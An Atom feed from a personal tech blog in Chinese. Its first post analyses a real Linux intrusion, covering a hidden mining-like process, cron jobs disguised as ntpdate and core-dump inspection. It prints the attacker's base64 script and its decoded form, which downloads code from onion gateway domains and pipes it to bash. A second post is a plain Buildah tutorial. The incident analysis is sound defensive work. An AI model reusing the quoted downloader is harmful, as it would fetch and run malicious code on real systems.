<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Yiran&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://zdyxry.github.io/"/>
  <updated>2019-10-25T15:05:18.656Z</updated>
  <id>https://zdyxry.github.io/</id>
  
  <author>
    <name>yiran</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>记一次系统被入侵分析过程</title>
    <link href="https://zdyxry.github.io/2019/10/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%B3%BB%E7%BB%9F%E8%A2%AB%E5%85%A5%E4%BE%B5%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/"/>
    <id>https://zdyxry.github.io/2019/10/25/记一次系统被入侵分析过程/</id>
    <published>2019-10-25T14:33:06.000Z</published>
    <updated>2019-10-25T15:05:18.656Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>今天早上接到同事报警，环境中两个节点出现了 CPU 使用率告警，通过 <code>top</code> 查看发现是一个叫 <code>iSdqkI</code> 的进程，但是这明显不是常规进程，初步怀疑是系统被入侵了，在同事的协助下最终解决了。这次主要记录遇到这种问题的排查思路，也算是对过程的复述。</p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>首先我们得到的信息是 CPU 使用率告警，第一时间是通过 <code>top</code> 来看看是哪个进程在作怪：</p><img src="/2019/10/25/记一次系统被入侵分析过程/i01.png" title="i01"><p>可以看到 <code>FnrgiY</code> 这个进程 CPU 使用率为 556%，且这个进程不是我们系统中存在的进程，这里判断是入侵后被植入的软件，通过 <code>ps</code> 命令查看进程的具体执行内容：</p><img src="/2019/10/25/记一次系统被入侵分析过程/i02.png" title="i02"><p>可以看到， <code>FnrgiY</code> 应该是一个可执行的程序（可能是脚本，也可能是一个 binary 文件），我非常年轻的想通过 <code>find</code> 查看这个文件在哪，然后 kill 掉进程删除文件就好了：</p><img src="/2019/10/25/记一次系统被入侵分析过程/i03.png" title="i03"><p>嗯，果然年轻了，系统下不存在该文件，那么我们尝试在 <code>/proc/15582</code> 下来看看有什么线索，先看看 <code>cmdline</code> ，跟进程名相同，没啥信息</p><img src="/2019/10/25/记一次系统被入侵分析过程/i04.png" title="i04"><p>同样 <code>stack</code> 文件也没什么有用的信息</p><img src="/2019/10/25/记一次系统被入侵分析过程/i05.png" title="i05"><p>来看看这个进程的 <code>cwd</code> 是啥，可以看到 <code>cwd</code> 是 <code>/usr/bin</code> 路径的软链接，但是我刚刚已经检查过了，在 <code>/usr/bin/</code> 下没有这个可执行文件</p><img src="/2019/10/25/记一次系统被入侵分析过程/i06.png" title="i06"><p>通过 <code>lsof -p</code> 命令，来看看这个进程打开了哪些文件，可以看到它启动的进程文件是 <code>/usr/bin/e6bb0f*</code> ，但是被删掉了，然后它还有一个 TCP 连接（先不管），看到一个存在的文件 <code>/tmp/.X11-unix/1</code> </p><img src="/2019/10/25/记一次系统被入侵分析过程/i07.png" title="i07"><p>来看看这个文件是啥，<code>cat</code> 一下发现这个文件其实是 pid 文件，并没有其他信息</p><img src="/2019/10/25/记一次系统被入侵分析过程/i08.png" title="i08"><p>既然它用到了这个文件，那么我们来看下这个文件所在路径，引用 <a href="https://unix.stackexchange.com/questions/196677/what-is-tmp-x11-unix" target="_blank" rel="noopener">StackExchange</a> 里面的回答：</p><blockquote><p>The X11 server (usuall Xorg these days) communicates with clients like xterm, firefox, etc via some kind of reliable stream of bytes. A Unix domain socket is probably a bit more secure than a TCP socket open to the world, and probably a bit faster, as the kernel does it all, and does not have to rely on an ethernet or wireless card.</p></blockquote><p>我们来看下这个路径下还有什么文件，发现了 3 个异常的文件： 01, 1, 2，其中 1 文件是异常进程的 pid 文件，2 文件是空的，01 文件记录也是一个 pid</p><img src="/2019/10/25/记一次系统被入侵分析过程/i09.png" title="i09"><p>通过 <code>ps</code> 来查看这个 pid 对应进程，也是一个异常进程，这个进程有一个紫禁城是执行了一个 Shell 脚本，是通过 Base64 编码过的，来解码看看</p><img src="/2019/10/25/记一次系统被入侵分析过程/i10.png" title="i10"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@yiran-workstation:~ </span><br><span class="line"><span class="meta"> $</span><span class="bash"> <span class="built_in">echo</span> ZXhlYyAmPi9kZXYvbnVsbApleHBvcnQgUEFUSD0kUEFUSDovYmluOi9zYmluOi91c3IvYmluOi91c3Ivc2JpbjovdXNyL2xvY2FsL2JpbjovdXNyL2xvY2FsL3NiaW4KdD10b3JudHBheG53Nnl4aGw0CnUoKSB7Cng9L2Nybgp3Z2V0IC10MSAtVDE4MCAtcVUtIC1PLSAtLW5vLWNoZWNrLWNlcnRpZmljYXRlICQxJHggfHwgY3VybCAtbTE4MCAtZnNTTGtBLSAkMSR4Cn0KaWYgISBscyAvcHJvYy8kKGNhdCAvdG1wLy5YMTEtdW5peC8wMSkvaW87IHRoZW4KKAp1ICR0Lm9uaW9uLmdsYXNzIHx8CnUgJHQuY2l2aWNsaW5rLm5ldHdvcmsgfHwKdSAkdC5vbmlvbi5tbiB8fAp1ICR0Lm9uaW9uLnNoIHx8CnUgJHQub25pb24uaW4ubmV0IHx8CnUgJHQudG9yMndlYi5pbyB8fAp1ICR0LjR0b3IubWwgfHwKdSAkdC5vbmlvbi50bwopfGJhc2gKZmkK|base64 -d</span></span><br><span class="line"></span><br><span class="line">exec &amp;&gt;/dev/null</span><br><span class="line">export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</span><br><span class="line">t=torntpaxnw6yxhl4</span><br><span class="line">u() &#123;</span><br><span class="line">x=/crn</span><br><span class="line">wget -t1 -T180 -qU- -O- --no-check-certificate $1$x || curl -m180 -fsSLkA- $1$x</span><br><span class="line">&#125;</span><br><span class="line">if ! ls /proc/$(cat /tmp/.X11-unix/01)/io; then</span><br><span class="line">(</span><br><span class="line">u $t.onion.glass ||</span><br><span class="line">u $t.civiclink.network ||</span><br><span class="line">u $t.onion.mn ||</span><br><span class="line">u $t.onion.sh ||</span><br><span class="line">u $t.onion.in.net ||</span><br><span class="line">u $t.tor2web.io ||</span><br><span class="line">u $t.4tor.ml ||</span><br><span class="line">u $t.onion.to</span><br><span class="line">)|bash</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>我们可以看看这个脚本的内容，先是重定向了标准输出，然后定义了一个函数，函数的作用是 wget/curl 下载一个文件，如果对应 pid 文件不存在，那么执行这个函数，并传递了很多的域名。</p><p>现在问题来了，进程怎么执行的？因为我有两台机器都有问题，我尝试 <code>kill</code> 掉异常进程，发现没有自动重启，那么很有可能是在系统上存在定时任务，通过 <code>crontab -l</code> 查看</p><img src="/2019/10/25/记一次系统被入侵分析过程/i11.png" title="i11"><p>看到了一个 <code>/root/.systemd-ntpdate</code> 同步时间的任务，我想直接忽略了，但是 jiewei 同学让我查看下这个文件，是不是真的仅仅是时间同步，于时就看了下，好嘛，差点被骗</p><img src="/2019/10/25/记一次系统被入侵分析过程/i12.png" title="i12"><p>既然 <code>crontab -l</code> 都已经配置了，那肯定要检查下其他路径下的配置文件，比如 <code>/etc/cron.d</code> <code>/etc/cron.daily</code> 等路径，果然又发现了一个 <code>0systemd-ntpdate</code> </p><img src="/2019/10/25/记一次系统被入侵分析过程/i13.png" title="i13"><img src="/2019/10/25/记一次系统被入侵分析过程/i14.png" title="i14"><p>脚本内容都是一样的，只是 sleep 的参数不同</p><img src="/2019/10/25/记一次系统被入侵分析过程/i15.png" title="i15"><p>既然找到了启动方式，那么现在可以直接 kill 掉进程，并删除 crontab 配置了，fengli 同学想要看看这个进程做了啥，于是通过 <code>gcore</code> 来生成了 core dump 文件</p><img src="/2019/10/25/记一次系统被入侵分析过程/i16.png" title="i16"><p>通过 <code>strings</code> 查看该 coredump 文件，来看看能找到什么有用的信息</p><img src="/2019/10/25/记一次系统被入侵分析过程/i17.png" title="i17"><p>与公网服务器是通过 jsonrpc 发送请求的，但是请求信息被编码过，不知道具体是什么内容</p><img src="/2019/10/25/记一次系统被入侵分析过程/i18.png" title="i18"><p>可以看到大量的 cpu 型号，应该是收集了这个节点的硬件信息</p><img src="/2019/10/25/记一次系统被入侵分析过程/i19.png" title="i19"><p>配置了 SOCK 代理，估计还有访问国外地址的请求</p><img src="/2019/10/25/记一次系统被入侵分析过程/i20.png" title="i20"><p>再就没看出什么了，清理掉相关进程信息，同时清理掉定时任务，收工。</p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>但是想着通过 google 查一下连接的那个公网 IP，看看有没有其他受害者，果然，发现了一篇<a href="http://www.ishenping.com/ArtInfo/3753664.html" target="_blank" rel="noopener">博客</a> 也写了一个分析过程，整体分析流程类似。</p><p>同时发现了360 在今年写的一篇<a href="https://blog.netlab.360.com/systemdminer-propagation-through-ddg/" target="_blank" rel="noopener">博客</a> ，里面很详细的分析了这个入侵方式，通过什么方式入侵，有什么特征之类的，推荐阅读。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>当你的系统已经被别人入侵过了，那么你不要相信任何你看到的东西。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://unix.stackexchange.com/questions/196677/what-is-tmp-x11-unix" target="_blank" rel="noopener">https://unix.stackexchange.com/questions/196677/what-is-tmp-x11-unix</a> </li><li><a href="https://blog.netlab.360.com/systemdminer-propagation-through-ddg/" target="_blank" rel="noopener">https://blog.netlab.360.com/systemdminer-propagation-through-ddg/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;今天早上接到同事报警，环境中两个节点出现了 CPU 使用率告警，通过 &lt;code&gt;top&lt;/code&gt; 查看发现是一个叫 &lt;code&gt;iSd
      
    
    </summary>
    
    
      <category term="Linux" scheme="https://zdyxry.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Buildah 初次体验</title>
    <link href="https://zdyxry.github.io/2019/10/19/Buildah-%E5%88%9D%E6%AC%A1%E4%BD%93%E9%AA%8C/"/>
    <id>https://zdyxry.github.io/2019/10/19/Buildah-初次体验/</id>
    <published>2019-10-19T02:15:39.000Z</published>
    <updated>2019-10-19T02:16:35.768Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>上周体验了 <a href="https://zdyxry.github.io/2019/10/12/Podman-%E5%88%9D%E6%AC%A1%E4%BD%93%E9%AA%8C/">Podman</a> 来管理容器的构建、生命周期管理等。Podman 自身是可以通过 Dockerfile 来进行容器镜像的构建，并且也支持容器镜像的 pull/push/login 等操作，Buildah 能够带来什么好处，我们为什么要使用它？</p><p>注意：本文章所采用环境为 CentOS7，需要除了 Buildah 工具外，还需要安装 <code>containers-common</code> 用于配置容器。</p><h2 id="What"><a href="#What" class="headerlink" title="What"></a>What</h2><p>我们现在使用的容器管理工具无论是 Podman 还是 Docker，都是符合 OCI 规范的，他们操作的镜像也需要符合 OCI 规范，Buildah 介绍很简单： <code>A tool that facilitates building OCI images</code>。</p><p>Buildah 功能列表：</p><ol><li>创建容器</li><li>通过 Dockerfile 或者一个处于运行状态的容器（指 Buildah 自身创建的容器，Podman 不可见</li><li>挂载/卸载镜像文件系统</li><li>使用更新后挂载的镜像文件系统作为文件系统层创建新的镜像</li><li>…</li></ol><h3 id="Buildah-与-Podman-的关系"><a href="#Buildah-与-Podman-的关系" class="headerlink" title="Buildah 与 Podman 的关系"></a>Buildah 与 Podman 的关系</h3><p>在官方说法中，Buildah 与 Podman 是相辅相成的关系，有很多共同点：它们都不需要 root 权限；都可以通过 Dockerfile 来构建容器镜像；都采用 fork-exec 模型；都不需要守护进程等等。 Buildah 主要的优势在于可以在没有 Doclerfiles 的情况下创建容器镜像，这也造成了从 Docker 切换到 Buildah 的用户使用成本会稍微高一些，因为部分概念发生了改变，主要有以下这些对比：</p><table><thead><tr><th>Command</th><th>Podman Behavior</th><th>Buildah Behavior</th></tr></thead><tbody><tr><td>build</td><td>Calls buildah bud</td><td>Provides the build-using-dockerfile (bud) command that emulates Docker’s build command.</td></tr><tr><td>commit</td><td>Commits a Podman container into a container image. Does not work on a Buildah container. Once committed the resulting image can be used by either Podman or Buildah.</td><td>Commits a Buildah container into a container image. Does not work on a Podman container. Once committed, the resulting image can be used by either Buildah or Podman.</td></tr><tr><td>mount</td><td>Mounts a Podman container. Does not work on a Buildah container.</td><td>Mounts a Buildah container. Does not work on a Podman container.</td></tr><tr><td>pull and push</td><td>Pull or push an image from a container image registry. Functionally the same as Buildah.</td><td>Pull or push an image from a container image registry. Functionally the same as Podman.</td></tr><tr><td>run</td><td>Run a process in a new container in the same manner as docker run.</td><td>Runs the container in the same way as the RUN command in a Dockerfile.</td></tr><tr><td>rm</td><td>Removes a Podman container. Does not work on a Buildah container.</td><td>Removes a Buildah container. Does not work on a Podman container.</td><td></td></tr><tr><td>rmi, images, tag</td><td>Equivalent on both projects.</td><td>Equivalent on both projects.</td></tr><tr><td>containers and ps</td><td>ps is used to list Podman containers. The containers command does not exist.</td><td>containers is used to list Buildah containers. The ps command does not exist.</td></tr></tbody></table><h2 id="How"><a href="#How" class="headerlink" title="How"></a>How</h2><h3 id="从-Dockerfile-构建镜像"><a href="#从-Dockerfile-构建镜像" class="headerlink" title="从 Dockerfile 构建镜像"></a>从 Dockerfile 构建镜像</h3><p>buildah 提供了 <code>build-using-dockerfile</code> 命令支持从 Dockerfile 构建镜像，命令等同于 <code>docker build</code> 与 <code>podman build</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ cat Dockerfile  <span class="comment"># 编写 Dockerfile</span></span><br><span class="line">FROM centos</span><br><span class="line"></span><br><span class="line">MAINTAINER &lt;zdyxry@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">CMD <span class="built_in">echo</span> <span class="string">"hello yiran"</span></span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ buildah bud -t yiran . <span class="comment"># 使用 `bud` 命令构建镜像，等同于 `docker build`</span></span><br><span class="line">STEP 1: FROM centos</span><br><span class="line">STEP 2: MAINTAINER &lt;zdyxry@gmail.com&gt;</span><br><span class="line">STEP 3: CMD <span class="built_in">echo</span> <span class="string">"hello yiran"</span></span><br><span class="line">STEP 4: COMMIT yiran</span><br><span class="line">Getting image <span class="built_in">source</span> signatures</span><br><span class="line">Copying blob 9e607bb861a7 skipped: already exists</span><br><span class="line">Copying blob 5f70bf18a086 skipped: already exists</span><br><span class="line">Copying config ebaeed04e2 <span class="keyword">done</span></span><br><span class="line">Writing manifest to image destination</span><br><span class="line">Storing signatures</span><br><span class="line">ebaeed04e23610d304c74d1e3bc0c428162e6e7eac529dce1376d8b284604b85</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ buildah images</span><br><span class="line">REPOSITORY                 TAG      IMAGE ID       CREATED              SIZE</span><br><span class="line">localhost/yiran            latest   ebaeed04e236   3 seconds ago        227 MB</span><br><span class="line">docker.io/library/centos   latest   0f3e07c0138f   2 weeks ago          227 MB</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ podman images <span class="comment"># 构建出来的镜像保存在 `/var/lib/containers/storage` ，因此 Podman 可以直接使用</span></span><br><span class="line">REPOSITORY                 TAG      IMAGE ID       CREATED              SIZE</span><br><span class="line">localhost/yiran            latest   ebaeed04e236   7 seconds ago        227 MB</span><br><span class="line">docker.io/library/centos   latest   0f3e07c0138f   2 weeks ago          227 MB</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ podman run localhost/yiran:latest</span><br><span class="line">hello yiran</span><br></pre></td></tr></table></figure><h3 id="从容器中构建镜像"><a href="#从容器中构建镜像" class="headerlink" title="从容器中构建镜像"></a>从容器中构建镜像</h3><p>这是 Buildah 最常使用方式，<code>buildah</code> 配合 Host 的命令操作来达到简化镜像构建的目的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ buildah from centos</span><br><span class="line">centos-working-container</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ buildah run centos-working-container yum install httpd -y</span><br><span class="line">Complete!</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ <span class="built_in">echo</span> <span class="string">"Hi yiran"</span> &gt; index.html</span><br><span class="line">You have new mail.</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ buildah copy centos-working-container index.html /var/www/html/index</span><br><span class="line">062e7183713e39f9788fe12ef40c298aa69e394df5ee9699aa6c136fb32f3144</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ buildah config --entrypoint <span class="string">"/usr/sbin/httpd -DFOREGROUND"</span> centos-working-container      </span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ buildah commit centos-working-container  yiran-httpd</span><br><span class="line">Getting image <span class="built_in">source</span> signatures</span><br><span class="line">Copying blob 9e607bb861a7 skipped: already exists</span><br><span class="line">Copying blob a6d6842abbd9 <span class="keyword">done</span></span><br><span class="line">Copying config daa1399f36 <span class="keyword">done</span></span><br><span class="line">Writing manifest to image destination</span><br><span class="line">Storing signatures</span><br><span class="line">bdaa1399f36944ff74e6fe20c5b346aece51f5edb9c47907027ac4d877ccf179c</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ buildah images</span><br><span class="line">REPOSITORY                 TAG      IMAGE ID       CREATED          SIZE</span><br><span class="line">localhost/yiran-httpd      latest   daa1399f3694   7 seconds ago    277 MB</span><br><span class="line">localhost/yiran            latest   ebaeed04e236   13 minutes ago   227 MB</span><br><span class="line">&lt;none&gt;                     &lt;none&gt;   975b7fcdfccc   13 minutes ago   227 MB</span><br><span class="line">&lt;none&gt;                     &lt;none&gt;   8cafad8a1ab0   15 minutes ago   227 MB</span><br><span class="line">docker.io/library/centos   latest   0f3e07c0138f   2 weeks ago      227 MB</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ podman images</span><br><span class="line">REPOSITORY                 TAG      IMAGE ID       CREATED          SIZE</span><br><span class="line">localhost/yiran-httpd      latest   daa1399f3694   15 seconds ago   277 MB</span><br><span class="line">localhost/yiran            latest   ebaeed04e236   13 minutes ago   227 MB</span><br><span class="line">&lt;none&gt;                     &lt;none&gt;   975b7fcdfccc   13 minutes ago   227 MB</span><br><span class="line">&lt;none&gt;                     &lt;none&gt;   8cafad8a1ab0   15 minutes ago   227 MB</span><br><span class="line">docker.io/library/centos   latest   0f3e07c0138f   2 weeks ago      227 MB</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ podman run -p 8080:80 localhost/yiran-httpd:latest</span><br><span class="line">AH00558: httpd: Could not reliably determine the server<span class="string">'s fully qualified domain name, using 10.88.0.5. Set the '</span>ServerName<span class="string">' directive globally to suppress this message</span></span><br></pre></td></tr></table></figure><p>上述操作解释如下：</p><ol><li><code>buildah from</code> 命令创建一个新的处于运行中的容器</li><li><code>buildah run &lt;container id&gt;</code> 在容器中执行命令</li><li><code>echo yiran &gt; index.html</code> 在主机上执行的命令，生成文件，该文件保存在主机上</li><li><code>buildah copy</code> 将主机上的文件拷贝到容器中，等同于 Dockerfile 中的 <code>COPY</code></li><li><code>buildah config --entrypoint</code> 给容器配置 entrypoint，等同于 Dockerfile 中的 <code>ENTRYPOINT</code></li><li><code>buildah commit</code> 将该容器制作为镜像，保存在 <code>/var/lib/containers/</code> 下</li></ol><h3 id="挂载镜像"><a href="#挂载镜像" class="headerlink" title="挂载镜像"></a>挂载镜像</h3><p>buildah 提供了 <code>buildah mount</code> 命令，可以将运行中容器挂载到 Host 的文件系统上，我们可以直接在 Host 上对容器内文件进行操作：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ buildah images</span><br><span class="line">REPOSITORY                  TAG      IMAGE ID       CREATED          SIZE</span><br><span class="line">localhost/yiran-httpd       latest   daa1399f3694   25 minutes ago   277 MB</span><br><span class="line">localhost/yiran             latest   ebaeed04e236   39 minutes ago   227 MB</span><br><span class="line">docker.io/library/centos    latest   0f3e07c0138f   2 weeks ago      227 MB</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ buildah from localhost/yiran-httpd</span><br><span class="line">yiran-httpd-working-container</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ buildah mount yiran-httpd-working-container</span><br><span class="line">/var/lib/containers/storage/overlay/75d42aaf05bfb855d59c7ae32ac138acd17c6a40f56cd541b16bffad6c720e9b/merged</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ cat /var/lib/containers/storage/overlay/75d42aaf05bfb855d59c7ae32ac138acd17c6a40f56cd541b16bffad6c720e9b/merged/var/www/html/index</span><br><span class="line">Hi yiran</span><br></pre></td></tr></table></figure><p>我们除了可以直接操作容器内文件，也可以在 Host 上给容器安装一些软件，如 dnf、make 等工具：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dnf install --installroot=&lt;container mountpoint&gt;</span><br><span class="line">make install DESTDIR=&lt;container mountpoint&gt;</span><br></pre></td></tr></table></figure><p>这里面临一个问题：如果在构建镜像的时候依赖于我们 Host 的环境，那么就无法达到我们想要的构建环境隔离了。这个问题可以通过使用多个容器共同构建来解决。</p><p>假设如果我们需要 gcc 环境，那么我们可以准备两个容器：其中一个包含 gcc ，并用它来编译，编译完成后在另一个纯净的容器中安装，最终只需要 commit 纯净的容器就可以。</p><p>这里的好处是 buildah 方式构建镜像，不会像 Dockerfile 一样包含很多层，只有执行 <code>buildah commit</code> 的时候产生一层镜像文件，我们也不需要考虑清理编译环境等问题。</p><h2 id="Why"><a href="#Why" class="headerlink" title="Why"></a>Why</h2><p>了解了基本的使用，那么我们需要知道为什么要使用 Buildah。</p><p>首先如果不使用 Buildah，对于整个容器工具链来说是完全 Ok 的，哪怕是不使用 Docker，仅凭 <code>podman build</code> 命令配合 Dockerfile 也是足够的，我们可以构建我们所需要的任意镜像。</p><p>使用 Buildah 能带来什么好处呢？我理解是我们可以通过更多的手段去构建镜像，不局限于 Dockerfile 中有限的关键字，我们有了更多的可能性，这就足够了。无论是 Buildah 原生命令还是通过 <code>buildah mount</code> 挂载到本地文件系统，都让我们可以更舒服的构建镜像，我们从维护一个 Dockerfile 转变为维护一个 Shell 脚本。</p><p>当然无论使用哪种方式，我们都需要知道 OCI 镜像标准是什么，这是最基本的。</p><p>Shell 脚本示例：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/env bash</span></span><br><span class="line"></span><br><span class="line">set -o errexit</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Create a container</span></span><br><span class="line">container=$(buildah from fedora:28)</span><br><span class="line">mountpoint=$(buildah mount $container)</span><br><span class="line"></span><br><span class="line">buildah config --label maintainer="yiran &lt;zdyxry@gmail.com&gt;" $container</span><br><span class="line"></span><br><span class="line">curl -sSL http://ftpmirror.gnu.org/hello/hello-2.10.tar.gz \</span><br><span class="line">     -o /tmp/hello-2.10.tar.gz</span><br><span class="line">tar xvzf src/hello-2.10.tar.gz -C $&#123;mountpoint&#125;/opt</span><br><span class="line"></span><br><span class="line">pushd $&#123;mountpoint&#125;/opt/hello-2.10</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install DESTDIR=$&#123;mountpoint&#125;</span><br><span class="line">popd</span><br><span class="line"></span><br><span class="line">chroot $mountpoint bash -c "/usr/local/bin/hello -v"</span><br><span class="line"></span><br><span class="line">buildah config --entrypoint "/usr/local/bin/hello" $container</span><br><span class="line">buildah commit --format docker $container hello</span><br><span class="line">buildah unmount $container</span><br></pre></td></tr></table></figure></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://github.com/containers/buildah" target="_blank" rel="noopener">https://github.com/containers/buildah</a></li><li><a href="http://chris.collins.is/2017/08/17/buildah-a-new-way-to-build-container-images/" target="_blank" rel="noopener">http://chris.collins.is/2017/08/17/buildah-a-new-way-to-build-container-images/</a> </li><li><a href="https://developers.redhat.com/blog/2019/02/21/podman-and-buildah-for-docker-users/" target="_blank" rel="noopener">https://developers.redhat.com/blog/2019/02/21/podman-and-buildah-for-docker-users/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;上周体验了 &lt;a href=&quot;https://zdyxry.github.io/2019/10/12/Podman-%E5%88%9D%E6
      
    
    </summary>
    
    
      <category term="Linux" scheme="https://zdyxry.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Podman 初次体验</title>
    <link href="https://zdyxry.github.io/2019/10/12/Podman-%E5%88%9D%E6%AC%A1%E4%BD%93%E9%AA%8C/"/>
    <id>https://zdyxry.github.io/2019/10/12/Podman-初次体验/</id>
    <published>2019-10-12T13:40:30.000Z</published>
    <updated>2019-10-12T13:41:13.325Z</updated>
    
